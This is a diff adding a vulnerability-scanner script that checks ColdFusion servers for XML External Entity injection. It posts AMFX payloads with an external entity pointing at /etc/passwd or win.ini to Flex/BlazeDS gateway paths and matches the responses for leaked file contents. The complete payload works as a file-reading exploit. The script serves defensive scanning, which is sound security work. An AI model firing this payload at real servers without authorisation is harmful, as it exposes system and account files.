@@ -1,0 +1,129 @@
+#include helpers.inc;
+#include classMatches.inc;
+#include string_helpers.inc;
+// **************************************************************************************							 
+function alert(fname, matchedText)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(fname);
+	ri.affects = "Web Server";
+	ri.alertPath = "Scripts/" + fname; 	
+		
+	ri.setHttpInfo(lastJob);
+	
+	if (matchedText) 
+		ri.Details =  ri.Details + "[break]Pattern found: [pre][blue]" + matchedText + "[/blue][/pre]";	
+	
+	addHTTPJobToCrawler(lastJob, 1, 1);
+	AddReportItem(ri);	
+}							 
+// **************************************************************************************							 
+function request(uri, fname)
+{
+	lastJob = new THTTPJob();
+		
+	lastJob.url = scanURL;
+	lastJob.addCookies = false;
+	lastJob.verb = 'POST';
+	lastJob.URI = uri;
+	lastJob.request.addHeader('Content-type', 'application/x-amf', true);
+	lastJob.request.body = '<?xml version="1.0" encoding="utf-8"?>' + CRLF() +
+		'<!DOCTYPE test [ <!ENTITY x3 SYSTEM "' + fname + '"> ]>' + CRLF() +
+		'<amfx ver="3" xmlns="http://www.macromedia.com/2005/amfx">' + CRLF() +
+		'  <body>' + CRLF() +
+		'      <object type="flex.messaging.messages.CommandMessage">' + CRLF() +
+		'        <traits>' + CRLF() +
+		'          <string>body</string><string>clientId</string><string>correlationId</string>' + CRLF() +
+		'          <string>destination</string><string>headers</string><string>messageId</string>' + CRLF() +
+		'          <string>operation</string><string>timestamp</string><string>timeToLive</string>' + CRLF() +
+		'        </traits><object><traits />' + CRLF() +
+		'        </object>' + CRLF() +
+		'        <null /><string /><string />' + CRLF() +
+		'        <object>' + CRLF() +
+		'          <traits>' + CRLF() +
+		'            <string>DSId</string><string>DSMessagingVersion</string>' + CRLF() +
+		'          </traits>' + CRLF() +
+		'          <string>nil</string><int>1</int>' + CRLF() +
+		'        </object>' + CRLF() +
+		'        <string>&x3;</string>' + CRLF() +
+		'  <int>5</int><int>0</int><int>0</int>' + CRLF() +
+		'  </object>' + CRLF() +
+		'  </body>' + CRLF() +
+		'</amfx>' + CRLF();
+	lastJob.execute();	
+	if (!lastJob.wasError && lastJob.response.msg2 == 200 && !lastJob.notFound)
+	{
+		return true;
+	}	
+	
+	return false;
+}
+// **************************************************************************************
+function Test1()
+{
+	var urls = [
+					"/flex2gateway/http",
+					"/messagebroker/http",
+					"/samples/flex2gateway/http",
+					"/samples/messagebroker/http"
+				];
+	
+	matches.plainArray = [
+							"; for 16-bit app support"	
+						  ];
+	
+	matches.regexArray = [
+						/(\w[\w-]+\:(!|\*|[^:]+)\:\d+\:\d+:[^:]*\:[^:]*\:[^\r^\n]*(\r?\n|\r|)){3}/
+					  ];	
+	
+	for (var i=0;i<urls.length;i++)
+	{ 	
+		var found = false;
+	
+		if (request(urls[i], '/etc/passwd'))
+		{
+			var matchedText = matches.searchOnText(lastJob.response.body);	
+			if (matchedText) 
+			{
+				alert("XML_External_Entity_Injection_And_XML_Injection.xml", matchedText); 	
+				found = true;
+			}
+		}
+		if (!found && request(urls[i], 'c:/windows/win.ini'))
+		{
+			var matchedText = matches.searchOnText(lastJob.response.body);	
+			if (matchedText)
+				alert("XML_External_Entity_Injection_And_XML_Injection.xml", matchedText); 	
+		}			
+	}
+}
+// **************************************************************************************	
+function startTesting()
+{
+	Test1();
+}
+// **************************************************************************************	
+function ColdFusionIsDetected()
+{
+	lastJob = new THTTPJob();
+	
+	lastJob.addCookies = false;	
+	lastJob.verb = "GET";
+	lastJob.url  = scanURL;		
+	lastJob.uri  = "/" + randStr(10) + ".cfm";;	
+	
+	lastJob.execute();
+	if (!lastJob.wasError && lastJob.notFound && lastJob.response.body.indexOf('<title>Error Occurred While Processing Request</title>') != -1)
+	{
+		return true;
+	}	
+	return false;
+}
+/***********************************************************************************/
+/* main entry point */
+var matches = new classMatches();
+var lastJob = null;
+if (ColdFusionIsDetected()) 
+{
+	startTesting();
+}
